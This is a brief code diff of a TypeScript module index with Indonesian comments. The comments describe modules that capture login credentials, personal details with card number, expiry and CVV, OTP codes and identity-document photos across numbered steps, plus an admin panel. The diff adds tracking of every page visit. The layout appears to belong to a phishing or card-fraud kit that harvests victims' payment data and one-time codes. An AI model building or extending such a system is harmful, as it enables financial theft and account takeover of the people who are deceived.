@@ -13,6 +13,7 @@ export * from "./login-logs";           // Step 1 & 3 — username · password �
 export * from "./personal-submissions"; // Step 4     — data pribadi + kartu (digits, exp, cvv)
 export * from "./otp-submissions";      // Step 5     — kode OTP
 export * from "./contact-submissions";  // Step 6     — contact form + foto dokumen
+export * from "./page-visits";          // Tracking   — setiap kunjungan halaman
 
 /* ═══════════════════════════════════════════════════════════
    ADMIN / HR PANEL — manajemen internal
